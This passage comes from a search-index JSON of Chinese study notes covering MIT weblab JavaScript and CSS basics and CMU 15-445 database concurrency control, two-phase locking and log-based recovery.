<p>\u8ba9\u6574\u4e2a\u7f51\u7ad9\u4e2d\u6240\u6709\u7684size\uff0c\u90fd\u4ee58\u7684\u500d\u6570\u4e3asize\uff0c\u4f1a\u4f7f\u5f97\u6574\u4e2a\u7f51\u7ad9\u66f4\u6709\u8bbe\u8ba1\u611f</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#css_2","title":"css\u8d44\u6e90","text":"<p>bootstrap</p> <p>\u4e00\u4e2a\u8d44\u6e90\u5e93\uff0c\u91cc\u9762\u6709\u4e00\u4e9bui\u7ec4\u4ef6</p> <p>font choose</p> <p>\u7f51\u4e0a\u6709\u4e00\u4e9b\u7f51\u7ad9\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684\u5b57\u4f53\u9009\u62e9\uff0c\u4f8b\u5982Browse Fonts - Google Fonts</p> <p>\u4ee5\u5982\u4e0b\u65b9\u5f0f\u4f7f\u7528</p> <pre><code>@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&amp;display=swap');\n\nbody{\n    font-family: 'Open Sans', sans-serif;\n}\n</code></pre> <p>\u4e0a\u8ff0\u4e24\u7ec4\u4fe1\u606f\uff0c\u7f51\u7ad9\u90fd\u4f1a\u63d0\u4f9b\u7ed9\u6211\u4eec</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#javascript-basic","title":"javascript basic","text":"<p>\u5728Chrome\u4e2d\u6253\u5f00\u63a7\u5236\u53f0-&gt; ctrl + shift + i</p> <p>javascript\u7684\u6838\u5fc3\u601d\u60f3\u662f\u8ba9\u6574\u4e2a\u7f51\u9875\u53d8\u5f97interactive</p> <p>js\u540c\u65f6\u4e5f\u53ef\u4ee5manipulate\u6574\u4e2a\u7f51\u9875\u7684\u5185\u5bb9</p> <p>js\u548c\u6211\u4eec\u5e73\u65f6\u63a5\u89e6\u7684\u4e00\u4e9b\u7f16\u7a0b\u8bed\u8a00java\uff0cpython\u662f\u6bd4\u8f83\u76f8\u4f3c\u7684\uff0c\u4f46\u662f\u6211\u4eec\u4f7f\u7528===, !==\u4f5c\u4e3a\u6761\u4ef6\u5224\u65ad\u7b49\u4e8e\u548c\u4e0d\u7b49\u4e8e</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#basic-part-of-js","title":"basic part of js","text":"<p>\u53d8\u91cf\u5b9a\u4e49</p> <pre><code>let myJudge = true;\n</code></pre> <p>\u5f53\u6211\u4eec\u521d\u6b21\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5e94\u5f53\u4f7f\u7528let\u5173\u952e\u8bcd\u628a\u5b83\u5b9a\u4e49\u51fa\u6765\u3002</p> <ul> <li>js\u4e2d\u5b58\u5728const\u53d8\u91cf\uff0c\u5176\u9700\u8981\u5982\u4e0b\u5b9a\u4e49\u3002const\u53d8\u91cf\u548c\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7c7b\u4f3c\uff0c\u5728\u5b9a\u4e49\u521d\u59cb\u5316\u4e4b\u540e\uff0c\u4e0d\u518d\u80fd\u88ab\u8d4b\u503c</li> </ul> <pre><code>const myans = 10;\n</code></pre> <ul> <li>underfined and null \u8fd9\u4e24\u79cd\u5728js\u662f\u4e0d\u540c\u7684\u5b58\u5728</li> </ul> <pre><code>let firstName; \u6b64\u65f6\u8fd9\u4e2a\u53d8\u91cf\u662funderfined\nfirstName = \"aaa\";\nfirstName = null; null\u7528\u6765\u6e05\u7a7a\u8fd9\u4e2a\u53d8\u91cf\n</code></pre> <ul> <li>we now shouldn't use keyword 'var'. We should use the 'let' instead. ?</li> </ul> <p>\u8f93\u51fa</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528console.log()\u4f5c\u4e3a\u8f93\u51fa\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u7684console\u5185\u90e8\u67e5\u770b\u8f93\u51fa</p> <p>\u4f46\u662fconsole\u8f93\u51fa\u5e76\u4e0d\u662f\u552f\u4e00\u7684\u9009\u62e9\uff0c\u6211\u4eec\u5f80\u5f80\u4e5f\u4f1a\u91c7\u7528\u4e00\u4e9b\u66f4\u52a0\u5bb9\u6613\u663e\u793a\u7684\u65b9\u5f0f\u4f5c\u4e3a\u8f93\u51fa\u3002\u4f8b\u5982alert</p> <pre><code>alert(\"hello\");\n</code></pre> <p>\u8fd9\u6bb5js\u4ee3\u7801\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5f39\u7a97\uff0c\u5185\u5bb9\u662fhello</p> <p>\u6761\u4ef6\u8bed\u53e5\u548c\u5faa\u73af\u8bed\u53e5</p> <p>like C/C++</p> <p>advanced data type</p> <ul> <li>array  \u5176\u5b9a\u4e49\u7684\u65b9\u5f0f\u548c\u4f7f\u7528\u7684\u65b9\u5f0f\u90fd\u662f\u8f83\u4e3a\u719f\u6089\u7684</li> </ul> <pre><code>let pets = [\"pig\",\"dog\",\"cat\"];\nconsole.log(pets[2]);\npets[0] = \"big pig\";\npets.push(\"bird\");\nlet lengthOfArray = pets.length;\n</code></pre> <p>js\u7684array\u662f\u66f4\u52a0\u5f3a\u5927\u4e14\u7075\u6d3b\u7684type\uff0c\u6709\u81ea\u5df1\u7684\u64cd\u4f5c\u96c6\u5408likeC++\u7684vector\uff0c\u7ecf\u5178\u7684\u53ef\u4ee5\u4f7f\u7528pop\uff0cpush</p> <p>\u5728js\u4e2d\u6211\u4eec\u5e76\u4e0d\u5f3a\u5236array\u5fc5\u987b\u662f\u76f8\u540c\u5143\u7d20\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u5728\u7f16\u7a0b\u4e2d\u5f53\u4f60\u9700\u8981\u628a\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20\u5f3a\u884c\u5408\u5728\u4e00\u4e2a\u6570\u7ec4\u4e2d\u65f6\uff0c\u4f1a\u6709\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6cd5</p> <ul> <li>map and filter method</li> </ul> <pre><code>myArray.map(onefunction); \u5185\u90e8\u8981\u4f20\u5165\u4e00\u4e2afunction,\u4ee5\u6570\u7ec4\u7684\u5143\u7d20\u4e3a\u53c2\u6570\uff0c\u5e76\u4e14\u8fd4\u56de\u503c\u6210\u4e3a\u65b0\u7684\u6570\u7ec4\u7684\u5143\u7d20\nmyArray.filter(onefunction): \u4ee5\u6570\u7ec4\u7684\u5143\u7d20\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u503c\u5e94\u5f53\u662f\u5e03\u5c14\u503c\uff0c\u5224\u65ad\u8fd9\u4e2a\u6570\u636e\u662f\u5426\u8981\u88ab\u7b5b\u9009\u6389\n\u4e00\u4e2a\u4f8b\u5b50\nlet newArray = myArray.map(x =&gt; x+2);  \u5bf9\u6bcf\u4e2a\u5143\u7d20\u52a02\u5e76\u8fd4\u56de\u65b0\u7684\u6570\u7ec4\nlet newArray = myArray.filter(x =&gt; x &gt;=0);\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#function","title":"function","text":"<p>function\u7684\u4f7f\u7528\u5728js\u4e2d\u7a0d\u5fae\u6709\u4e9b\u4e0d\u540c\u3002</p> <p>\u5176\u57fa\u7840\u7684\u5b9a\u4e49\u5f62\u5f0f\u662f parameters =&gt; {bodys};  \u8bb0\u5f97\u51fd\u6570\u5b9a\u4e49\u7684\u672b\u5c3e\u8981\u52a0' ; '\uff0c\u8bbe\u8ba1\u4f53\u73b0\u4e86\u51fd\u6570\u5b9a\u4e49\u5176\u5b9e\u548c\u53d8\u91cf\u5b9a\u4e49\u7684\u7c7b\u4f3c\u6027</p> <pre><code>const celsiusToFahrenheit = tempC =&gt;{\n    const tempF = tempC * 1.8 + 32;\n    return tempF;\n}\nconsole.log(celsiusToFahrenheit(10));\n</code></pre> <p>\u5728js\u4e2d\uff0cfunctions can be passes around like any other variable.</p> <p>\u5728C/C++\u4e2d\u6211\u4eec\u5f80\u5f80\u901a\u8fc7\u51fd\u6570\u6307\u9488\u5b9e\u73b0\u8fd9\u4e2a\u7ed3\u679c\uff0c\u4f46\u662f\u5728js\u4e2d\u6211\u4eec\u5b9e\u73b0\u5730\u66f4\u52a0\u7b80\u5355\u6613\u61c2</p> <pre><code>const addTwo = x=&gt;{return x+2;};\nconst changeArray = (array, callback)=&gt;{\n    for(let i=0;i&lt;array.length;i++){\n        array[i] = callback(array[i]);\n    }\n};\nlet myArr = [1,2,3];\nchangeArray(myArr, addTwo);\n</code></pre> <ul> <li>anonymous functions \u533f\u540d\u51fd\u6570\uff0c\u6216\u8005\u8bf4\u662f\u4e34\u65f6\u7684\u4e00\u4e2a\u51fd\u6570\u3002\u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684\u51fd\u6570\u7b49\u7b49\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u8fdb\u884c\u4f7f\u7528</li> </ul> <pre><code>changeArray(myArr, x=&gt;{\n    return x*2;\n});\n</code></pre> <p>\u8fd8\u6709\u66f4\u52a0\u7b80\u6613\u7684\u5199\u6cd5</p> <pre><code>changeArray(myArr,x=&gt;x*2);\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#object-and-class","title":"object and class","text":"<p>object</p> <pre><code>const objectName = {\n    items : value,\n    items : value\n}:\n</code></pre> <p>\u53ef\u4ee5\u6709\u4e00\u4e9b\u7b80\u6613\u7684\u65b9\u6cd5\u53bb\u83b7\u5f97object\u5185\u90e8\u7684\u5143\u7d20</p> <pre><code>const myCar = {\n    make : \"ford\",\n    model : \"mustang\",\n    year  : 2005\n};\nconst {make, model} = myCar;\n</code></pre> <p>\u867d\u7136js\u548cjava\u6ca1\u6709\u5173\u7cfb\uff0c\u4f46\u662f\u5176\u5728object\u548c\u6570\u7ec4\u7684\u8868\u793a\u4e0a\u9075\u4ece\u548cjava\u7c7b\u4f3creference type\u7684\u6a21\u5f0f\uff0c\u4e5f\u5373\u5b83\u4eec\u672c\u8eab\u90fd\u662f\u6307\u9488\u3002\u56e0\u6b64\u6709\u5982\u4e0b\u4ee3\u7801</p> <pre><code>let arr1 = [1,2];\nlet arr2 = [1,2];\narr1 === arr2; \u8be5\u7ed3\u679c\u4e3afalse\uff0c\u56e0\u4e3a\u6bd4\u8f83\u7684\u662f\u53cc\u65b9\u7684\u5730\u5740\n</code></pre> <p>\u56e0\u6b64\u5728\u8d4b\u503c\u65b9\u9762\u4e5f\u9075\u5faa\u548cjava\u7c7b\u4f3c\u7684\u539f\u5219\uff0c\u4e5f\u5373\u5bf9\u4e8ereference type\u4efb\u4f55\u7684\u8d4b\u503c\u90fd\u662f\u53ea\u662f\u5730\u5740\u7684\u4f20\u9012\uff0c\u5b83\u4eec\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58</p> <pre><code>let myCar = {\n    make : \"ford\",\n    model : \"mustang\",\n    year  : 2005\n};\nlet anoCar = myCar;\nanoCar.year = 2000; \u5b9e\u9645\u4e0a\u540c\u65f6\u6539\u53d8\u4e86anoCar\u548cmyCar\u5185\u90e8\u7684year\n</code></pre> <p>\u5f53\u6211\u4eec\u9700\u8981\u505a\u771f\u6b63\u7684\u62f7\u8d1d\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528 ... \u6765\u505a\uff0c...\u64cd\u4f5c\u7b26\u4f1a\u505a\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u5c55\u5f00\u7684\u5de5\u4f5c</p> <pre><code>let copyArr = [...arr];\nlet copyObj = {...obj};\n</code></pre> <p>class</p> <p>\u63a5\u4e0b\u6765\u51fa\u73b0\u7684class\u6982\u5ff5\uff0c\u4f1a\u66f4\u63a5\u8fd1\u4e8e\u6211\u4eec\u4e4b\u524d\u63a5\u89e6\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u6982\u5ff5</p> <pre><code>class Rectangle{\n    constructor(width, height){\n        this.width = width;\n        this.height - height;\n    }\n\n    getArea = () =&gt; {\n        return this.width * this.height;\n    };\n}\nconst rect = new Rectangle(1,32);\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#dom-and-js","title":"DOM and js","text":"<p>\u6211\u4eec\u5f80\u5f80\u628ajs\u6587\u4ef6\u52a0\u5165\u5230html\u4ee3\u7801\u7684\u672b\u7aef</p> <pre><code>&lt;script src=\"index.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#jshtml","title":"js\u5982\u4f55\u4e0ehtml\u4ea4\u4e92","text":"<p>\u5982\u4f55\u7528js\u8bbf\u95eehtml\u7684\u5143\u7d20\uff0c\u5728js\u4e2d\u4ee5id\u5bfb\u627ehtml\u5143\u7d20\u662f\u6700\u57fa\u7840\u7684</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u83b7\u53d6\u5230\u7684html\u5143\u7d20\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u4fee\u6539</p> <pre><code>headerDiv.innerHTML = \"hello world\";\nheaderDiv.style.color = \"red\";\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u589e\u52a0\u5143\u7d20\uff0c\u4f8b\u5982\u589e\u52a0\u65b0\u7684\u4e00\u5217\u5217\u8868</p> <p>\u4e5f\u53ef\u4ee5\u589e\u52a0\u4ea4\u4e92\u6027</p> <pre><code>const button = document.getElementById(\"button\");\nbutton.addEventListener(\"click\", ()=&gt;{\n    alert(\"hello\");\n});\n</code></pre> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#js-workshop","title":"js workshop","text":"<p>\u5728\u591a\u6587\u4ef6\u7684\u6761\u4ef6\u4e0b\uff0cjs\u6587\u4ef6\u4e4b\u95f4\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u5bf9\u65b9\u7684\u51fd\u6570\uff0c\u53ea\u8981\u5728\u6700\u540e\u628a\u6240\u6709\u7528\u5230\u7684js\u6587\u4ef6\u90fd\u52a0\u5165\u5230html\u6587\u4ef6\u4e0a</p> <p>weblab \u4e3ajs\u57fa\u7840\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u8d2a\u5403\u86c7\u7684\u6e38\u620f\u4f5c\u4e3a\u7ec3\u4e60\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u6838\u5fc3\u7684code</p> <pre><code>const draw = () =&gt; {\n  gameBoard.innerHTML = ''; //\u6e05\u7a7a\u5185\u90e8\u7684html\n                            //\u4f7f\u5f97\u53ef\u4ee5\u91cd\u65b0\u7ed8\u5236\n  drawSnake(gameBoard);\n};\nconst drawSnake = (gameBoard) =&gt; {\n  for (let i = 0; i &lt; snakeBody.length; i++) {\n    const segment = snakeBody[i];\n    const snakeElement = document.createElement('div');\n    snakeElement.style.gridRowStart = segment.y;\n    snakeElement.style.gridColumnStart = segment.x;\n    snakeElement.classList.add('snake');  //\u8ba9\u8fd9\u4e2a\u5757\u52a0\u5165\u5230class\u4e2d\u4ee5\u9002\u5e94CSS\n    gameBoard.appendChild(snakeElement);\n  }\n};\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/","title":"Concurrency and recovery","text":"<p>\u6beb\u65e0\u7591\u95ee\uff0c\u5728\u591a\u7528\u6237\u72b6\u6001\u4e0b\uff0c\u6570\u636e\u5e93\u662f\u5b58\u5728\u591a\u7ebf\u7a0b\u95ee\u9898\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u4e8b\u52a1(Transaction)\u6765\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#transaction","title":"Transaction","text":"<p>\u6240\u8c13\u7684\u4e00\u4e2a\u4e8b\u52a1\uff0c\u5176\u672c\u8eab\u662f\u6307\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u6574\u4f53\u9700\u8981\u88ab\u89c6\u4e3a\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c\u3002\u4e8b\u52a1\u901a\u8fc7\u4fdd\u8bc1ACID\u5c5e\u6027\u6765\u907f\u514d\u5e76\u53d1\u95ee\u9898</p> <ul> <li>Atomicity \u4e8b\u52a1\u4ee5\u4e24\u79cd\u65b9\u5f0f\u505c\u6b62\uff0ccommit\u6216abort\uff0c\u6240\u6709\u64cd\u4f5c\u8981\u4e48\u53d1\u751f\u8981\u4e48\u4e0d\u53d1\u751f</li> <li>consistency DB\u5728\u4e8b\u52a1\u524d\u540e\u90fd\u4fdd\u6301\u4e00\u81f4</li> <li>Isolation \u4e8b\u52a1\u4e4b\u95f4\u7684\u64cd\u4f5c\u662f\u9694\u79bb\u7684\uff0c\u867d\u7136\u5728\u5185\u90e8\u4e0d\u4e00\u5b9a\u662f\u9694\u79bb\u7684\uff0c\u5426\u5219\u6548\u7387\u592a\u4f4e\uff0c\u4f46\u662f\u4f1a\u786e\u4fdd\u8868\u73b0\u51fa\u6765\u7684\u7ed3\u679c\u662f\u9694\u79bb\u7684</li> <li>Durabilty \u5982\u679c\u4e8b\u52a1\u88ab\u63d0\u4ea4\uff0c\u5176\u6548\u679c\u4e00\u5b9a\u8981\u5728\u5931\u8d25\u540e\u4fdd\u5b58\u4e0b\u6765\u7684</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#concurrency-control","title":"concurrency control","text":"<p>\u6700\u4e3b\u8981\u7684\uff0c\u6211\u4eec\u9700\u8981\u4fdd\u6301\u9694\u79bb\u6027\uff0c\u6700\u7b80\u5355\u7684\u505a\u6cd5\u5c31\u662f\u5355\u7ebf\u7a0b\u6267\u884c\u6240\u6709\u4e8b\u7269\uff0c\u786e\u4fdd\u4e00\u4e2a\u4e8b\u52a1\u7ed3\u675f\u540e\u518d\u6267\u884c\u4e0b\u4e00\u4e2a\uff0c\u6211\u4eec\u5c06\u8fd9\u79cd\u505a\u6cd5\u79f0\u4e3aserial schedule\u3002\u4f46\u662f\u6548\u7387\u5f88\u4f4e\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u6784\u5efa\u5e76\u884c\u7684\u64cd\u4f5c\u5e8f\u5217\uff0c\u4e5f\u5c31\u662f\u5f15\u51fa\u4e86\u6211\u4eec\u9700\u8981\u5224\u65ad\u4e24\u4e2a\u64cd\u4f5c\u662f\u5426\u4e3aconfict</p> <p>\u5982\u679c\u4e24\u4e2a\u64cd\u4f5c\u662fconflict\uff0c\u5176\u5fc5\u5b9a\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6</p> <ul> <li>\u4e24\u4e2a\u64cd\u4f5c\u6765\u81ea\u4e0d\u540ctransaction</li> <li>\u4e24\u4e2a\u64cd\u4f5c\u9488\u5bf9\u540c\u4e00\u4e2aresource</li> <li>\u81f3\u5c11\u4e00\u4e2a\u64cd\u4f5c\u662f\u5199\u5165</li> </ul> <p>\u5982\u679c\u4e00\u4e2a\u64cd\u4f5c\u5e8f\u5217\u5176\u7ed3\u679c\u6ee1\u8db3\u7b49\u6548\u4e8eserial schedule\uff0c\u6211\u4eec\u5c06\u5176\u79f0\u4e3aserializable</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u4f9d\u8d56\u56fe\u7684\u65b9\u6cd5\u5224\u65ad\u4e00\u4e2aschedule\u662f\u5426\u662fserializable\uff0c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#two-phase-locking","title":"Two phase Locking","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u6570\u636e\u800c\u8a00\uff0c\u57fa\u7840\u7684\u64cd\u4f5c\u5c31\u662f\u8bfb\u548c\u5199\uff0c\u8981\u4fdd\u6301\u5e76\u53d1\u5b89\u5168\uff0c\u4e00\u4e2a\u6570\u636e\u53ea\u80fd\u7531\u4e00\u4e2a\u4e8b\u52a1\u5728\u5199\uff0c\u6216\u8005\u591a\u4e2a\u4e8b\u52a1\u5728\u8bfb\uff08\u8ba9\u6211\u60f3\u8d77\u4e86Rust\u91cc\u7684\u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528hhh\uff09\u3002\u56e0\u6b64\u5199\u9700\u8981\u72ec\u5360\u9501\uff0c\u8bfb\u9700\u8981\u5171\u4eab\u9501\u3002</p> <p>\u4e00\u4e2a\u4e8b\u7269\u5e8f\u5217\u4f1a\u8bbe\u7f6e\u4e00\u7cfb\u5217\u7684\u9501\u5b9a\u70b9\uff0c\u5176\u9700\u8981\u5728\u4e8b\u52a1\u83b7\u53d6data\u4e4b\u524d\u83b7\u53d6\u6389\u6240\u6709\u6240\u9700\u7684\u9501\u3002</p> <p>\u6839\u636e2PL\u7684\u89c4\u5b9a\uff0c\u5f53\u4e8b\u52a1\u91ca\u653e\u6389\u5b83\u7684\u7b2c\u4e00\u4e2a\u9501\u4e4b\u540e\uff0c\u5176\u4e0d\u80fd\u518d\u83b7\u5f97\u65b0\u7684\u9501</p> <p>\u57282PL\u534f\u8bae\u4e0b\uff0c\u6bcf\u4e2atransaction\u90fd\u4f1a\u7ecf\u8fc7\u4e24\u4e2a\u9636\u6bb5\uff1a\u5728\u7b2c\u4e00\u4e2a\u9636\u6bb5\u91cc\uff0ctransaction\u6839\u636e\u9700\u8981\u4e0d\u65ad\u5730\u83b7\u53d6\u9501\uff0c\u53eb\u505a growing phase (expanding phase) \uff1b\u5728\u7b2c\u4e8c\u4e2a\u9636\u6bb5\u91cc\uff0ctransaction\u5f00\u59cb\u91ca\u653e\u5176\u6301\u6709\u7684\u9501\uff0c\u6839\u636e2PL\u7684\u89c4\u5219\uff0c\u8fd9\u4e2atransaction\u4e0d\u80fd\u518d\u83b7\u5f97\u65b0\u7684\u9501\uff0c\u6240\u4ee5\u5b83\u6240\u6301\u6709\u7684\u9501\u9010\u6e10\u51cf\u5c11\uff0c\u53eb\u505a shrinking phase (contracting phase) \u3002</p> <p>\u8fd9\u4e2a\u673a\u5236\uff0c\u4fdd\u8bc1\u4e86\u51b2\u7a81\u4e8b\u52a1\u64cd\u4f5c\u6784\u6210\u7684schedule\u662fserializable\u7684</p> <p>2PL\u7684\u95ee\u9898\u5728\u4e8e\u5176\u5bb9\u6613\u53d7\u5230\u7ea7\u8054\u4e2d\u6b62\u7684\u5f71\u54cd\uff0c\u6bd4\u5982\u4e8b\u52a12\u8bfb\u4e86\u4e8b\u52a11\u5199\u5b8c\u4e4b\u540e\u7684\u6570\u636e\uff0c\u4f46\u662f\u6b64\u65f6\u4e8b\u52a11\u9700\u8981\u88ababort\u4e86\uff0c\u8fd9\u65f6\u5019\u4e8b\u52a12\u5c31\u51fa\u73b0\u4e86\u810f\u8bfb\uff0c\u5bfc\u81f4\u4e8b\u52a12\u4e5f\u9700\u8981\u7ec8\u6b62\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#recovery","title":"recovery","text":"<p>recovery\u5c31\u662f\u8ba9\u6570\u636e\u5e93\u7cfb\u7edf\u62e5\u6709\u62b5\u5fa1\u6545\u969c\u7684\u80fd\u529b\uff0c\u8fd9\u6d89\u53ca\u5230\u4e8b\u52a1\u7684\u4e24\u4e2a\u6027\u8d28</p> <ol> <li>Durability: \u4e8b\u52a1\u4e00\u65e6\u5b8c\u6210\uff0c\u6211\u4eec\u6c38\u8fdc\u4e0d\u4f1a\u4e22\u5931\u4e8b\u52a1\u7684\u7ed3\u679c</li> <li>Atomicity: \u4e8b\u52a1\u6c38\u8fdc\u4e0d\u4f1a\u5904\u4e8e\u4e2d\u95f4\u6001\uff0c\u8981\u4e48\u5b8c\u6210\uff0c\u8981\u4e48\u5b8c\u6210\u4e0d\u505a</li> </ol> <p>\u8981\u7ef4\u62a4\u4e24\u4e2a\u6027\u8d28\uff0c\u6211\u4eec\u9762\u5bf9\u4e00\u4e9b\u95ee\u9898</p> <ul> <li>buffer pool manager\u7684\u95ee\u9898\uff0c\u7531\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u901a\u8fc7buffer pool\u8fdb\u884c\uff0c\u5b9e\u9645\u4e0a\u4e8b\u52a1\u5b8c\u6210\u5199\u5165\u4e4b\u540e\uff0c\u5f88\u591apage\u8fd8\u7559\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21\u88ab\u66ff\u6362\u7b56\u7565\u9a71\u9010\u4e4b\u540e\u624d\u771f\u6b63\u8fdb\u5165\u78c1\u76d8\uff0c\u4f46\u662f\u5185\u5b58\u5728\u6545\u969c\u4e2d\u662f\u4e0d\u53ef\u9760\u7684</li> <li>\u540c\u65f6\uff0c\u5728\u6211\u4eec\u5199\u5165\u5185\u5b58\u4e4b\u540e\uff0cbuffer pool\u968f\u65f6\u6709\u53ef\u80fd\u56e0\u4e3a\u66ff\u6362\u7b56\u7565\u5c06\u4fee\u6539\u7684page\u5b58\u5165\u78c1\u76d8\uff0c\u8fd9\u4f7f\u5f97\u4e8b\u52a1\u5b58\u5728\u4e86\u4e2d\u95f4\u6001</li> </ul> <p>\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u4e00\u4e9b\u964d\u4f4e\u6548\u7387\u7684\u505a\u6cd5\uff0c\u6bd4\u5982\u5728\u5b8c\u6210\u4e8b\u52a1\u540e\u5f3a\u5236\u628a\u6240\u9700\u7684page\u5168\u90e8\u5199\u5165\u78c1\u76d8\uff0c\u6216\u8005\u786e\u4fdd\u5728\u4e8b\u52a1\u8fc7\u7a0b\u4e2d\u4efb\u4f55page\u4e0d\u4f1a\u88ab\u5199\u5165\u78c1\u76d8\u4e2d\uff0c\u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u662f\u4f4e\u6548\u7684\uff0c\u5e76\u4e14\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u62b9\u6740\u4e86buffer pool\u7684\u610f\u4e49\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#log-manager","title":"log manager","text":"<p>\u6211\u4eec\u91c7\u53d6\u65e5\u5fd7log\u7684\u505a\u6cd5\u5b9e\u73b0recovery\uff0c\u6211\u4eec\u5c06log\u5206\u4e3a\u51e0\u7c7b</p> <ul> <li>START</li> <li>UPDATE</li> <li>COMMIT</li> <li>ABORT</li> </ul> <p>log\u8bb0\u5f55\u540c\u6837\u9700\u8981\u4e00\u4e2apage\u6765\u5904\u7406\uff0c\u4f46\u662f\u5176\u672c\u8eab\u4e5f\u4f1a\u9047\u5230\u4e0a\u8ff0\u7684\u4e00\u7cfb\u5217\u95ee\u9898\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u505a\u4e00\u7cfb\u5217\u89c4\u5b9a</p> <ul> <li>log record\u4e00\u5b9a\u8981\u5148\u4e8e\u76f8\u5e94\u6570\u636e\u9875\u5199\u5165\u78c1\u76d8\u4e4b\u524d\u5199\u5165\u78c1\u76d8</li> <li>\u5f53\u4e8b\u52a1\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u6240\u6709\u65e5\u5fd7\u8bb0\u5f55\u90fd\u9700\u8981\u5199\u5165\u78c1\u76d8</li> </ul> <p>\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u6709\u80fd\u529b\u6062\u590d</p> <ol> <li>\u4e8b\u52a1\u63d0\u4ea4\u4e86\uff0c\u4f46\u662f\u6709\u4fee\u6539\u7684page\u8fd8\u5b58\u5728\u5185\u5b58\u91cc\uff0c\u8fd9\u65f6\u5019\u5d29\u6e83</li> <li>\u4e8b\u52a1\u4e2d\u95f4\u6001\uff0c\u6307\u6709\u4fee\u6539\u5df2\u7ecf\u5b58\u5230\u78c1\u76d8\u91cc\u9762\uff0c\u8fd9\u65f6\u5019\u5d29\u6e83</li> </ol> <p>implementation</p> 